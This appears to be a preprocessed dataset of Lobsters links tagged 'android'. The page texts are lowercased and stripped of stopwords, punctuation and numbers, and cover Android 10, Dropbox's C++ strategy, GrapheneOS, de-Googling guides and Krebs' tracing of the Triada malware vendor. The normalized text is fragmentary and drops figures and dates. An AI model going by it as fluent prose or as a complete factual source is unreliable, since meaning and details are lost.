network providing strong enough signal although uk provider offer service end likely year coverage approach addition larger pro model feature four camera rear include megapixel mp supersensing camera largerthannormal sensor handset let light captured thus benefit lowlight photography camera optical zoom mean user close subject without compromising resolution cine camera dedicated video use widerratio sensor others match widescreen format video normally watched firm also claim sensor provides best lowlight video sensitivity slowest slowmotion effect handset delivering frame per second depthsensing camera provides data used apply realistic blureffect still photo video background helping subject stand smaller standard model feature supersensing camera well wideangle version telephoto component portrait image copyright getty image image caption mr yu claimed new phone offer superior lowlight photography video rival huawei long sought market smartphones superior imaging technology rival case analyst suggest difficult pitch question huawei packed lot feature mate mate pro onstage performance always look impressive commented carolina milanesi analyst creative strategy many buyer outside china overlook lack google service company also unveiled huawei vision smart tv popup camera used make video call get feedback fitness exercise app well new smartwatch wireless ear bud
81,Lobsters,android,Android,iFixit disassembles the Fairphone 3,https://www.ifixit.com/Teardown/Fairphone+3+Teardown/125573,ifixit disassembles fairphone,nintendo switch kit quick fix get back game,nintendo switch kit quick fix get back game
82,Lobsters,android,Android,Welcoming Android 10,https://android-developers.googleblog.com/2019/09/welcoming-android-10.html,welcoming android,android open source project aosp android keyword blog innovation new experience foldables developer guide network existing apis live caption optional smart reply notification optout dark theme developer guide gesture navigation get started optimizing app privacy user android developer site giving user control location data developer guide blog post protecting location data network scan requiring fine location permission instead preventing device tracking best practice securing user data external storage blocking unwanted interruption security gartner may mobile os device security comparison platform quantifying measurable security even feature storage encryption adiantum tl default tl enhanced security platform hardening hardening several securitycritical area biometricprompt android security update camera medium dynamic depth photo open format audio playback capture new audio playback capture api blog post new audio video codecs using le bandwidth opus native midi api native midi api source code vulkan everywhere vulkan connectivity improved peertopeer internet connectivity network connection apis network suggestion apis wifi performance mode high performance low latency mode android foundation art optimization art profile neural network api tensorflow faster update fresher code project treble project mainline get apps ready android update current apps compatibility soon possible install app android emulator behavior change privacy change gesture navigation change dynamic linker path bionic library test android privacy feature new location permission scoped storage background activity start change data identifier checklist privacy change doc test us restricted nonsdk interface test library sdks app update publish compatible app crucial faster platform update throughout ecosystem enhance app android feature apis new feature apis dark theme dark theme force dark gesture navigation gesture navigation optimize foldables optimizing foldables interactive notification smart reply notification better biometrics biometricprompt audio playback capture audio playback capture better codecs opus native midi api better networking apis network connection apis android developer site android studio follow instruction coming device near available available android open source project next file new issue,posted stephanie cuthbertson senior director product management android year development month testing early adopter ready introduce android world android built around three important theme first android shaping leading edge mobile innovation advanced machinelearning support emerging device like foldables enabled phone next android central focus privacy security almost feature give user greater protection transparency control finally android expands user digital wellbeing control individual family find better balance technology today releasing android source code android open source project aosp making available broader ecosystem also starting official android rollout three generation pixel device worldwide many partner device including beta program receive update end year thank support year beta tested early release different beta device reporting unique issue top many article discussion survey inperson meeting voiced thought work make apps compatible today release support engagement make android amazing platform together oem partner created excitement android release ever fact android available device previous release android fortunate passionate community get started developing android visit android look android use today make sure check keyword blog innovation new experience android take advantage latest hardware software innovation build amazing app experience user foldables building robust multiwindow support android extends multitasking across app window provides screen continuity maintain app state device fold unfolds detail optimize apps foldables see developer guide video network promise deliver consistently faster speed lower latency android add platform support extends existing apis help take advantage enhancement use connectivity apis detect device high bandwidth connection check whether connection metered apps game tailor rich immersive experience user live caption automatically caption medium playing user device video podcasts audio message across app ml speech model run right phone audio stream ever leaf device developer live caption optional expands audience apps game making content accessible single tap live caption coming pixel device fall working closely partner launch broadly device running android video smart reply notification android us ondevice ml suggest contextual action notification smart reply message opening map address notification built feature user privacy mind keeping ml processing completely device apps take advantage feature right away optout rather generate suggestion smart reply suggest action based notification content dark theme android add systemwide dark theme ideal low light help save battery build custom dark theme app let system create one dynamically current theme see developer guide detail dark theme google keep gesture navigation android introduces fully gesture navigation mode eliminates navigation bar area allows apps use full screen deliver richer immersive experience get started optimizing app today gesture navigation give apps full screen content privacy user privacy central focus android stronger protection platform new feature designed privacy mind building previous release android includes extensive change protect privacy give user control improved system ui stricter permission restriction data apps use see android developer site detail support apps giving user control location data user control location data new permission option allow app access location app actually use running foreground apps provides sufficient level access user big improvement transparency control learn location change see developer guide blog post protecting location data network scan apis scanning network already required coarse location permission android increase protection around apis requiring fine location permission instead preventing device tracking apps longer access nonresettable device identifier could used tracking including device imei serial number similar identifier device mac address also randomized connected wifi network default read best practice help choose right identifier use case see detail securing user data external storage android introduces number change give user control file external storage app data within apps store file private sandbox must use mediastore access shared medium file use system file picker access shared file new downloads collection learn blocking unwanted interruption android prevents app launch background unexpectedly jump foreground take focus another app learn security android always working ass ongoing security investment refer measurable security one way measure ongoing investment third party analyst research gartner may mobile os device security comparison platform report subscription required scored android highest possible rating category ahead multiple point authentication network security malware protection read longterm work security quantifying measurable security finish line come security android introduced even feature keep user secure advance encryption platform hardening authentication storage encryption compatible device launching android required encrypt user data make efficient android includes adiantum new encryption mode tl default android also enables tl default major revision tl standard performance benefit enhanced security platform hardening android also includes hardening several securitycritical area platform update biometricprompt framework robust support face fingerprint implicit explicit authentication read android security update camera medium dynamic depth photo apps request dynamic depth image consists jpeg xmp metadata related depth related element depth confidence map embedded file let offer specialized blur bokeh option app dynamic depth open format ecosystem working partner bring device running android later dynamic depth image offer specialized blur bokeh option app audio playback capture app play audio let apps capture audio stream using new audio playback capture api addition enabling captioning subtitle api let support popular usecases like livestreaming game built new capability privacy copyright protection mind ability app capture another app audio constrained read blog post new audio video codecs android add support open source video codec allows medium provider stream high quality video content android device using le bandwidth addition android support audio encoding using opus open royaltyfree codec optimized speech music streaming high dynamic range video device support native midi api apps perform audio processing c android introduces native midi api communicate midi device ndk api allows midi data retrieved inside audio callback using nonblocking read enabling low latency processing midi message give try sample app source code vulkan everywhere vulkan requirement device running android higher recommendation device already see significant momentum vulkan support ecosystem among device running android n half support vulkan better new requirement android expect see adoption rise even coming year connectivity improved peertopeer internet connectivity refactored wifi stack improve privacy performance also improve common usecases like managing iot device suggesting internet connection without requiring location permission network connection apis make easier manage iot device local wifi peertopeer function like configuring downloading printing network suggestion apis let apps surface preferred wifi network user internet connectivity wifi performance mode apps request adaptive wifi enabling high performance low latency mode great benefit low latency important user experience realtime gaming active voice call similar usecases platform work device firmware meet requirement lowest power consumption android foundation art optimization improvement art runtime help apps start faster consume le memory run smoother without requiring work art profile delivered google play let art precompile part app even run runtime generational garbage collection make garbage collection efficient term time cpu reduces jank help apps run better lowerend device chart show percentage improvement startup time specific apps tested using play profile neural network api added new operation including argmax argmin quantized lstm alongside range performance optimization lay foundation accelerating much greater range model object detection image segmentation working hardware vendor popular machine learning framework tensorflow optimize roll support nnapi faster update fresher code android continuing focus bringing new platform device rapidly working closely devicemakers silicon partner like qualcomm project treble played key role helping u bring partner device year beta program along pixel device double number last year even better expect device get official android update end year working several partner new flagship launch update seeing great momentum android already device previous android release getting new version month ahead android also first release support project mainline officially called google play system update new technology securing android user keeping device fresh important code change direct google play google play system update able update specific internal component across device running android higher without requiring full system update device manufacturer expecting bring first update consumer device next several month developer expect update android help drive consistency platform implementation broadly across device time bring greater uniformity reduce development testing cost get apps ready android today public release android update coming soon device asking android developer update current apps compatibility soon possible give user smooth transition android install app android install current app google play onto pixel device running android emulator test app look great run well full functionality handle android behavior change properly watch impact privacy change gesture navigation change dynamic linker path bionic library others test android privacy feature new location permission scoped storage restriction background activity start change data identifier others see checklist top privacy change get started review privacy change doc area test test us restricted nonsdk interface move public sdk ndk equivalent instead detail test library sdks app find issue try updating latest version sdk reach sdk developer help update publish compatible app finished testing made update recommend publishing compatible app right away help deliver smooth transition user update android getting apps tested ready new version android crucial faster platform update throughout ecosystem please prioritize work possible enhance app android feature apis next ready dive android learn new feature apis use top feature get started recommend every app dark theme ensure consistent experience user enable systemwide dark theme adding dark theme enabling force dark gesture navigation support gesture navigation app going edgetoedge making sure custom gesture complementary system navigation gesture optimize foldables deliver seamless experience today innovative device optimizing foldables recommend relevant app interactive notification notification include message enable smart reply notification engage user let take action instantly better biometrics use biometric auth move biometricprompt preferred way support fingerprint auth modern device audio playback capture support captioning gameplay recording enable audio playback capture app great way reach user make app accessible better codecs medium apps try video streaming high dynamic range video speech music streaming use opus encoding musician native midi api available better networking apis app manages iot device wifi try new network connection apis function like configuring downloading printing read new feature change visit android developer site get started developing download official api sdk tool android studio higher follow instruction configure environment coming device near android begin rolling today three generation pixel phone pixel pixel even original pixel pixel device get update next week including enrolled year beta program pixel device watch official overtheair update coming soon always system image pixel device available manual download flash get latest android emulator system image via sdk manager android studio broader testing treblecompliant device generic system image gsi available looking android source find android open source project repository android branch next soon closing android beta issue tracker feedback app please keep feedback coming file new issue android aosp issue tracker thanks many developer early adopter participated android beta program year gave u great feedback filed thousand issue helped u make android platform great consumer developer looking forward seeing apps android
83,Lobsters,android,Android,The (not so) hidden cost of sharing code between iOS and Android,http://blogs.dropbox.com/tech/2019/08/the-not-so-hidden-cost-of-sharing-code-between-ios-and-android/,hidden cost sharing code io android,irbnb sunset use r eact n ative overhead custom framework library jinni nn overhead custom development environment overhead addressing difference platform overhead training hiring retaining developer join team,recently dropbox technical strategy mobile sharing code io android via c idea behind strategy code c instead twice java objective c adopted c strategy back mobile engineering team relatively small needed support fast growing mobile roadmap needed find way leverage small team quickly ship lot code android io completely backed strategy favor using platform native language primarily swift kotlin exist started decision due hidden cost associated code sharing thing learned company cost effectively share code stem basic issue writing code nonstandard fashion took overhead would worry stayed widely used platform default overhead ended expensive writing code twice breaking different type overhead encountered like clarify never actually got point codebase developed c overhead c adoption actually prevented u ever moving fully direction also worth noting much larger company like google facebook developing scalable codesharing solution several year solution far gained limited adoption avoid overhead described leveraging party code sharing solution like react native flutter still apply least one technology gain traction mature example airbnb sunset use react native many reason outlined post group different type overhead faced four main category overhead custom framework library easiest overhead predict c need build framework library roughly break subcategories framework would allow u interact host environment build full fledged mobile app example djinni tool generating crosslanguage type declaration interface binding framework running task background v main thread trivial task perform platform native language library would replace language defaultsopen source standard could used within platform native language example json de serialization nn nonnullable pointer c none code would necessary stayed platform native language contribution open source project would probably benefited developer platform native language possible could done better job leveraging open source c library open source culture c development community still strong mobile development community particular almost nonexistent c mobile community note cost particularly high c opposed possible nonnative language like python c lack single fullfeatured standard library said cc language compiler supported google apple using different language would created whole host problem deal overhead custom development environment mobile ecosystem lot tooling available make development efficient mobile ides rich google apple invested lot resource making best development experience developer corresponding platform moving away platform default gave away benefit notably debugging experience platform native language generally superior debugging c code via platform default ide one particularly memorable example bug causing deadlock background threading framework leading app randomly crash type bug hard pin even work simple standard stack issue involved debugging multithreaded code running back forth c java took week nail addition losing tool also invest time building tool would support c code sharing importantly needed custom build system created library containing c code well java objectivec wrapper could generate target understood xcodebuild gradle system big drag resource needed constantly updated support change two build system overhead addressing difference platform even though io android apps mobile apps generally expose feature functionality platform difference affect implementation example way application execute background task platform different even thing started fairly similar adopted crossplatform strategy greatly diverged time eg interaction camera roll result even really write code run different platform box spend lot time integrating code different platform writing platform specific code sometime code end c layer make theoretical benefit writing code live promise thus greatly reducing benefit approach begin overhead training hiring retaining developer last definitely least cost training andor hiring developer work custom stack dropbox started mobile strategy core group experienced c developer group started c project trained mobile developer dropbox contribute codebase time developer moved team company engineer remained sufficient experience fill technical leadership gap opened became increasingly difficult hire replacement senior engineer relevant c experience would interested mobile development result ended real lack critical expertise maintain c codebase way restore expertise invest substantially one two option find hire candidate specific skillset tried hire role year success train mobile c engineer inhouse missing skillset practically impossible longer someone desired skillset perform training even core group moved mobile engineer generally interested learning c finding people train big issue well top hiring problem rolling tech stack created retention developer simply want work c project caused lot talented mobile engineer leave project rather slog notverywell maintained custom stack general mobile development community technology pattern emerge frequently adopted quickly best developer like keep skill date keeping latest greatest challenge mature product environment standard stack sacrifice adoption speed stability challenge hugely magnified lock custom stack wider mobile ecosystem although writing code sound like great bargain associated overhead made cost approach outweigh benefit turned smaller expected anyway end longer share mobile code via c nonstandard way instead write code platform native language addition want engineer delightful experience able contribute back community made decision align practice industry standard hiring android io engineer get excited building amazing product contributing mobile ecosystem come join team
84,Lobsters,android,Android,Never Work In Theory: Research into software is made,http://neverworkintheory.org/,never work theory research software made,developer testing ide hiatus apex automatic programming assignment error explanation paradise unplugged five keep using word,nov developer testing ide keywords programming practice moritz beller gousios georgios annibale panichella sebastian proksch sven amann andy zaidman developer testing ide pattern belief behavior ieee transaction software engineering process software testing one key activity software quality practice despite importance however remarkable lack knowledge developer test realworld project paper report surprising result largescale field study software engineer whose development activity closely monitored course year four integrated development environment ides finding question giuseppe scanniello michele risi porfirio tramontana simone romano fixing fault c java source code abbreviated v fullword identifier name acm transaction software engineering methodology october carried family controlled experiment investigate whether use abbreviated identifier name respect fullword identifier name affect fault fixing c java source code family consists original baseline controlled experiment three replication involved participant different background experience total overall result suggested difference term posted short article datacamp work titled using data science explore software development grateful feedback doubly grateful could help get attention people look comment sooner move ahead building online course teach people get clean analyze make sense software engineering data new update derek jones empirical software engineering using r available page includes introduction statistic overview force shaping actual software engineering practice lot practical case study student work almost reference code data github along slide use workshop tremendous resource hope community rally behind dec hiatus keywords community site hiatus notice wake recent political event community energy attention focused important thing please get involved project like derek jones begun assembling book titled empirical software engineering using r view work far file issue github repo think really exciting development looking forward seeing evolve davide fucci giuseppe scanniello simone romano martin shepperd boyce sigweni fernando uyaguari burak turhan natalia juristo markku oivo external replication effect testdriven development using multisite blind analysis approach esem http context testdriven development tdd agile practice claimed improve quality software product well productivity developer previous study ie baseline experiment university oulu finland compared tdd testlast development tld approach randomized controlled trial result failed support claim goal want validate chris mattmann joshua garcia ivo krka daniel popescu nenad medvidovic revisiting anatomy physiology grid journal grid computing march http domainspecific software architecture dssa represents effective generalized reusable solution constructing software system within given application domain paper revisit widely cited dssa domain grid computing studied system domain last ten year time repeatedly observed individual grid system widely used deemed successful grid dssa actually underspecified xinyu wang sumit galwani rishabh singh fidex filtering spreadsheet data using example oopsla http data filtering spreadsheet common problem faced million endusers task data filtering requires computational model separate intended positive negative string instance present system fidex efficiently learn desired data filtering expression small set positive negative string example two key idea approach first design expressive dsl represent disjunctive filter expression needed several realworld data filtering task second develop oct apex automatic programming assignment error explanation keywords education tool program analysis symbolic execution dohyeong kim yongwhi kwon peng liu luk kim david mitchel perry xiangyu zhang gustavo rodriguezrivera apex automatic programming assignment error explanation oopsla http researcherwatsonibmcomresearcherfilesusliupapexpdf paper present apex system automatically generate explanation programming assignment bug regarding bug root cause led runtime failure work comparing passing execution correct implementation provided instructor failing execution buggy implementation submitted student technique overcomes number technical challenge caused syntactic semantic difference two santiago perez de rosso daniel jackson purpose concept misfit redesign git splash git widely used version control system powerful complicated complexity may inevitable consequence power rather evidence flaw design explore hypothesis analyzed design git using theory identifies concept purpose misfit wellknown difficulty git described explained misfit underlying concept fail meet intended purpose based analysis designed reworking git called sep paradise unplugged keywords diversity denae ford justin smith philip j guo chris parnin paradise unplugged identifying barrier female participation stack overflow http secret female engage le programming field male however online community stack overflow gender gap even extreme contributor female paper use mixedmethods approach identify contribution barrier female face online community semistructured interview spectrum female user ranging noncontributors top ranked user time identified barrier preventing sep five keywords education paper presented annual international computing education research conference melbourne earlier month give good sense c education researcher looking finding elizabeth patitsas jesse berlin michelle craig steve easterbrook evidence computer science grade bimodal although never rigourously demonstrated common belief c grade bimodal statistically analyzed distribution final course grade large research university found distribution passed test multimodality devised noted earlier week acm making paper year international computing education research conference freely two week nt anyone else mean open access frankly ridiculous therefore grateful neil brown pointing bullet page say author owner permanently hold right post accepted version work author home page owner institutional repository repository legally mandated agency funding research work based sep keep using word keywords opinion open access decided would review material openly available therefore pleased discover earlier week could actually download paper year international computing education research conference acm site read paper open access next two week emphasis added true real shame lot cool thing presented icer deserve widely known point posting link going time people outside great jonathan l krein lutz prechelt natalia juristo aziz nanthaamornphong jeffrey c carver sira vega charles knutson kevin seppi dennis l eggett multisite joint replication design pattern experiment using moderator variable generalize across context ieee trans software engineering april context several empirical study explored benefit software design pattern collective result highly inconsistent resolving inconsistency requires investigating variable cause effect differ across context objective replicate design pattern experiment multiple site identify sufficient moderator generalize result across helen sharp yvonne dittrich cleidson rb de souza role ethnographic study empirical software engineering ieee trans software engineering august ethnography qualitative research method used study people culture largely adopted discipline outside software engineering including different area computer science ethnography provide indepth understanding sociotechnological reality surrounding everyday software development practice ie help uncover practitioner also despite potential ethnography widely adopted empirical software engineering researcher felienne herman efthimia aivaloglou code smell hamper novice programming recently blockbased programming language like alice scratch blockly become popular tool programming education substantial research showing blockbased language suitable early programming education blockbased program smelly matter learner paper explore code smell metaphor context blockbased programming language scratch conduct controlled experiment novice scratch programmer divided novice three group one third receive nonsmelly program perspective data science software engineering present best practice seasoned data miner software engineering goal transfer knowledge expert seasoned software engineer data scientist newcomer field many book covering data mining software engineering basic present fundamental lack perspective come realworld experience book offer unique insight wisdom community leader idea presented digestible chapter designed applicable across many domain topic included cover data collection data sharing data mining invited participate survey software licensing designed investigate well software developer understand common open source software license looking software developer built currently building open source software project personally interested hearing people building open source software research study conducted prof gail murphy murphy csubcca graduate student daniel almeida daa csubcca participating anonymous online survey take approximately minute interested participating please go http surveyubccasurveysdanielalmeidasoftwarelicensingsurvey
85,Lobsters,android,Android,Freeing my phone from Google,https://www.hexaquo.at/posts/2019/06/29/Freeing+my+phone+from+Google,freeing phone google,introduction free software setup summary android operating system replicant http google apps apps app store fdroidorg browser mozillaorg map note location service unifiednlp radiocells messaging signalorg twitter calendar synchronization reddit hacker news limitation apkmirror closing word,introduction phone full ad nt even notice anymore suggestion notification nt ask tracking mechanism nt even know service control absurd much smartphones large extension private social life controlled monitored private company largely hidden way believe full control technology use essential society decided get rid google smartphone entirely use free libre software much possible setup nt trivial get surprisingly good experience post provide assistance recommendation well experience free software free software freedom freedom run program purpose freedom study change program work freedom redistribute copy distribute change program freedom allow u control software use instead letting control u foster collaborative community people develop think worth developing share result benefit setup summary rough process important step backup data want keep install open android o like replicant lineageos according respective guide phone install fdroid app store android operating system operating system core smartphone nonfree operating system ca nt possibly control happens data input really important building block decided use lineageos setup easy well documented usual smartphones available device may want give replicant try even focused freedom case guide needed http probably find something similar phone google apps usually setting different o next step install google apps offer usual android feature play store account management synchronization google map however also mean handing control phone google case simply skip step untouched free android system smartphone completely much owner lineageos anyone else us develops apps since using google apps play store however directly download apks internet instead need least fdroid probably asked give browser required permission install apks apps use addition lineageos stock apps app store fdroid available fdroidorg fdroid alternative google play store host free libre software well maintained easy use perfect endeavor browser firefox focus austria germany switzerland firefox klar available mozillaorg firefox focus minimalist privacyfocused browser search enter address thing delete session privacy feature ad blocking tracking protection enabled default really like distractionfree focused experience browser promotes encourages getting thing done concentrating thing opened browser map osmand available fdroid osmand display openstreetmap data openstreetmap database extremely detailed actually get much precise information google map also completely customizable data see example focus pedestrian road display subway tram line bus route tend commute nt care building outline turned type poi restaurant healthcare sightseeing etc make distractionfree well see specifically want see note location service without google apps able use osmand probably wo nt see location need location provider worked trialanderror install unifiednlp take hard way install directly system program basically dress google location provider middleman since apps expect install radiocells available via fdroid communitydriven geolocation database using wifi cell tower optionally also download radiobeacon contribute database need go location setting setting security location location advanced unifiednlp setting configure address lookup backends configure location backends select radiocells try selfcheck afterwards messaging signal available signalorg signal secure messaging app know tidy intuitive exactly need twitter twidere available fdroid twidere similar default twitter app much customizable also feel bit stable clean sidenote mastodon alternative twitter running free noncentralized network found researching apps look promising calendar synchronization davx available fdroid without google account synchronized calendar nt trivial add university provides caldav url previously used google calendar however obviously option davx adapter synchronizes caldav url provides calendar apps could also use caldav server want completely independent control reddit slide available fdroid slide similar reddit sync used everything need reddit app different view theme neat easily navigable comment etc hacker news materialistic available fdroid similar slide hacker news customizable intuitive minimalist limitation like completely free phone people proprietary apps like whatsapp unavoidable apps usually installed apkmirror host mirror apks play store well policed secure website play store apks know another option found yalp store available fdroid downloads manages apks directly google play store sensitive andor niche apps tricky proprietary netbanking app need use austrian bank account one still sure meantime service usually decent browser version well sticking closing word setup process relatively easy follow unfortunately really something recommend usual smartphone user think important assist want regain control nt technical knowledge setup another challenge proprietary apps little alternative netbanking app including verification app mandatory austrian railway app two biggest problem nonfree also available google must made known company problem getting rid dependency something customer care tell company problem positive note smartphone definitely become pleasant use exactly want want notification suggestion nt ask hidden tracking mechanism service work hidden possibly unethical way sense ownership control something gotten used smartphone phone really mine try
86,Lobsters,android,Android,Tracing the Supply Chain Attack on Android,https://krebsonsecurity.com/2019/06/tracing-the-supply-chain-attack-on-android-2/,tracing supply chain attack android,google disclosed yehuo blazefire 野 火 wildfire chinese software developer network blazefire com gamerbbs cn domaintoolscom shanghai blazefire network technology co ltd gmailcom register internet domain name elsyzsmc com rurimeter com triada malware drweb published research expanded research com buydudu com kelisrim com opnixi com sonyba com seen early distribution point hummer trojan yehuo blazefirenet com blazefire com blazefire net hsuheng com longmen com tongjue net com shanghai qianyou network technology co ltd shanghai wildfire network technology co ltd shanghai bronze network technology co ltd shanghai tongjue network technology co ltd blazefireyehuo chuda blazefirenet story longmen com embattled chinese telecom giant name cached document chinese business lookup service tianyanchacom still several company apps available download itunes store others shanghai qianyou network technology android blazefire chu da chuda dr web google haagen hagen hsu heng ltd shanghai blazefire network technology co ltd shanghai bronze network technology co shanghai qianyou network technology co shanghai tongjue network technology co shanghai wildfire network technology co gmailcom triada malware wildfire yehuo breadcrumb neerdowell news coming storm r,earlier month google disclosed supply chain attack one vendor resulted malicious software preinstalled million new budget android device google exactly name responsible said belief offending vendor us nickname yehuo blazefire follows deep dive identity chinese vendor appears long storied history pushing envelope mobile malware yehuo 野火 mandarin wildfire one might forgiven concluding google perhaps using another dictionary mandarin speaker google probably coy vendor question appears used blazefire wildfire two many corporate name adopted entity online search term yehuo reveals account chinese software developer network us nickname reference domain blazefire com searching point yehuo user gamerbbs cn advertises mobile game called xiaojun junji say game available blazefire com research blazefire com via domaintoolscom show domain assigned company called shanghai blazefire network technology co ltd short time registered someone using email address gmailcom shanghai blazefire network part group similarlynamed chinese entity mobile phone preinstallation business marketing advertiser product install service mobile phone installed software present preinstalled partner cover entire mobile phone industry chain including mobile phone chip manufacturer mobile phone design company mobile phone brand manufacturer mobile phone agent mobile terminal store major ecommerce platform read descriptive blurb company historic record search domaintools gmailcom address say used register internet domain name including least seven conclusively tied spread powerful android mobile malware two domain registered gmailcom elsyzsmc com rurimeter com implicated propagating triada malware triada malicious software google said found preinstalled many device used install spam apps display ad july russian antivirus vendor drweb published research showing triada installed default least four lowcost android model drweb expanded research discovered triada malware installed different model android device least another five domain registered gmailcom com buydudu com kelisrim com opnixi com sonyba com seen early distribution point hummer trojan potent strain android malware often bundled game completely compromise infected device record search domaintools shanghai blazefire network technology co return domain including blazefire net registered yehuo blazefirenet remainder post focus bolded domain name domain name create date registrar com alibaba cloud computing beijing co ltd com alibaba cloud computing beijing co ltd com alibaba cloud computing beijing co ltd blazefire com alibaba cloud computing beijing co ltd blazefire net alibaba cloud computing beijing co ltd hsuheng com godaddycom llc jyhxznet longmen com godaddycom llc longmenbiaoju com alibaba cloud computing beijing co ltd oppayment com alibaba cloud computing beijing co ltd tongjue net alibaba cloud computing beijing co ltd following breadcrumb domain see blazefire sprawling entity multiple business unit name example com domain name shanghai qianyou network technology co ltd firm say dedicated development operation internet mobile game like domain blazefire com com also initially registered gmailcom soon changed shanghai blazefire owner office shanghai quianyou network room floor building ouyang rd shanghai china hall shanghai wildfire network technology co ltd reportedly room floor building ouyang rd shanghai domain tongjue net web site shanghai bronze network technology co ltd appears either another name sister company shanghai tongjue network technology co ltd according marketing literature shanghai tongjue situated one door abovementioned shanghai quianyou network room floor building ouyang road developed large domestic wireless internet network application read help wanted ad published tongjue company mainly engaged mobile phone preinstallation business particular help wanted ad client software development role tongjue ad said ideal candidate position would experience window trojan virus game plugins among responsibility position crack restriction imposed manufacturer mobile phone research master android operating system reverse root software study root android mobile phone research antibrushing provide antireverse brushing scheme blazefireyehuo many domain mentioned somewhere registration history name hsu heng email address yehuo blazefirenet based analysis via cyber intelligence firm password email address exposed multiple data breach year past head blazefire go nickname hagen haagen us email chuda blazefirenet searching phrase chuda mandarin turn story chinese gaming industry news site youxiguanchacom feature numerous photo blazefire employee office story also refers cofounder ceo blazefire variously chuda chu da wildfire ceo chuda tearresistant bos sport barcelona hardcore fan literary genre playing good guitar story gush performance leading wildfire team wildfire product line chu top ten new ceo award first black rock award hardcore alliance interestingly registrant name chu da show historical domain name record longmen com perhaps shanghai wildfire oldest successful mobile game ever record april list chu da email address yehuo blazefirecom ceo wildfireblazefire referred chuda hagen clear chuda part ceo real name nickname vice president company list name simply hua wei could real name pseudonymous nod embattled chinese telecom giant name according cached document chinese business lookup service tianyanchacom chuda also senior executive six company google declined elaborate blog post shanghai wildfire respond multiple request comment perhaps worth noting google may wise cooking shanghai blazefirewildfire network technology co apple still several company apps available download itunes store well others shanghai qianyou network technology tag android blazefire chu da chuda dr web google haagen hagen hsu heng ltd shanghai blazefire network technology co ltd shanghai bronze network technology co shanghai qianyou network technology co shanghai tongjue network technology co shanghai wildfire network technology co gmailcom triada malware wildfire yehuo entry posted tuesday june filed breadcrumb neerdowell news coming storm follow comment entry r feed comment ping currently closed
87,Lobsters,android,Android,Android Bootcamp: Gecko development [slides],https://docs.google.com/presentation/d/1MzU9q2wCwojC0kb1eVfma8hrQ-KayCRFFd_mV5Gx1F4/edit#slide=id.g37695b23f5_0_10,android bootcamp gecko development slide,,javascript nt enabled browser file ca nt opened enable reload
88,Lobsters,android,Android,How to de-Google your Android phone,https://nolanlawson.com/2019/06/13/how-to-de-google-your-android-phone/,degoogle android phone,bacon cheeseburger mahimahi fdroid signal yalp store,first download rom russian message board okay totally verify gpg signature allow minute remember gpg work verify forum poster indeed signed file next root android phone need hold volumeup power button ten second unplug usb reboot time mess give download android dev tool figure android adb fastboot command see friendly ui green courier text black background press button say void warranty completely exonerate oem likely event actually pwning installing random software internet onto tracking device carry pocket every day okay trust andrej right next need install recovery tool despite name actually best way brick device luckily incredibly featurerich boasting button home screen including advanced button containing button button invite thing like clear dalvikart cache totally know mean download recovery tool make sure get right version phone course named phone brand name rather cheeky internal name chosen oem like bacon cheeseburger mahimahi professionalism display party fill confidence download recovery tool site called sickwarezbiz use gpg ensure signed andrej downloaded go recovery mode install rom careful press one correct button like game minesweeper brick phone lose also factoryreset device fine photo contact backed google ah right want something assuming successfully installed rom without turning phone doorstop install apps thankfully fdroid host favorite opensource apps wait favorite apps opensource well least signal wait signal installed yalp store sideloads apps google play way may may totally illegal get blocked google read blog post realize exists download actually useful apps thankfully though personal data safe secure thirdparty developer apps work prepared error message like please install google map google play service required kind sicko google phone without google wrong ceremony relax enjoy googlefree android device note though weather widget gps push notification majority android apps rely work said great notetaking apps plus sm still work good old sm successfully turned android device glorified nokia flip phone may may siphoning password ukrainian teenager finally googlefree smartphone experience could buy iphone
89,Lobsters,android,Android,GrapheneOS: privacy and security-focused mobile OS with Android compatibility,https://grapheneos.org/,grapheneos privacy securityfocused mobile o android compatibility,open source hardenedmalloc hardenedmalloc readme nextgeneration musl malloc implementation release page install page auditor app attestation service page tutorial issue tracker faq section device support,grapheneos open source privacy security focused mobile o android app compatibility focused research development privacy security technology including substantial improvement sandboxing exploit mitigation permission model grapheneos also develops various apps service focus privacy security vanadium hardened variant chromium browser webview specifically built grapheneos grapheneos also includes minimal securityfocused pdf viewer hardwarebased auditor app attestation service providing local remote verification device externally developed seedvault encrypted backup initially developed inclusion grapheneosgrapheneos collaborative open source project company used supported variety company organization wo nt closely tied company particular eventually nonprofit grapheneos foundation developer represent projectgrapheneos improves privacy security o bottom hardened kernel libc malloc compiler toolchain many lowlevel improvement change designed eliminate whole class serious vulnerability provide meaningful barrier exploitation avoid making change without clear rationale regularly work towards simplifying replacing lowlevel improvement malloc implementation hardenedmalloc providing cutting edge security modern system hardenedmalloc project portable linuxbased operating system adopted securityfocused operating system like whonix hardenedmalloc readme extensive documentation work also heavily influenced design nextgeneration musl malloc implementation offer substantially better security musl previous malloc still minimal memory usage code sizethere also many underthehood change higher level including major improvement selinux policy particularly app sandbox grapheneos try avoid impacting user experience privacy security feature ideally feature designed always enabled impact user experience additional complexity like configuration option always feasible grapheneos add various toggle feature like network permission sensor permission restriction device locked usb peripheral camera quick tile etc along complex userfacing privacy security feature uxgrapheneos made substantial contribution privacy security android open source project along contribution linux kernel llvm openbsd project much past work longer part downstream grapheneos project successfully landed many patch upstream even success making suggestion participating design discussion steer thing direction want many upstream change aosp removing app access lowlevel process network timing profiling information originated grapheneos project need upstream project often different often reimplement feature flexible way almost always able move using upstream feature even still need implementation help conceptsrestrictions considered upstream project apps needing compatible getting feature upstream often lead improved user experience app compatibilityofficial release available release page installation instruction install pagethe official grapheneos release supported auditor app attestation service auditor app attestation service provide strong hardwarebased verification authenticity integrity firmwaresoftware device strong pairingbased approach used also provides verification device identity based hardware backed key generated pairing softwarebased check layered top trust securely chained hardware detail see page tutorial also support operating systemsgrapheneos never include either google play service another implementation google service like microg part android open source project required baseline android compatibility apps designed run android rather android bundled google apps service already work grapheneos huge number open closed source apps already available itopen apis tied google continue implemented using open source provider like seedvault backup app texttospeech voicetotext nongpsbased location service geocoding accessibility service etc example open android apis need developbundle implementation based existing open source project compatibility apps depending google apis service improved implementing way pretend google stopped existing server unavailablegrapheneos founded daniel micay late started solo project incorporating previous open source privacysecurity work project initially created port openbsd malloc android bionic libc port pax kernel patch kernel supported device quickly expanded large set homegrown privacy security improvement particularly lowlevel hardening work compiler toolchain bionic work began landing code upstream aosp upstream project substantial portion early change either successfully landed upstream heavily influenced upstream change replaced project able move quickly day much low hanging fruit address nt yet trying produce highly robust production quality osin late company incorporated became primary sponsor project grapheneos previously known copperheados sponsored company intention use company build business around grapheneos selling support contract work customized proprietary variant o company supposed serve need open source project rather vice versa explicitly agreed grapheneos would remain independently owned controlled daniel micay company failed live promise 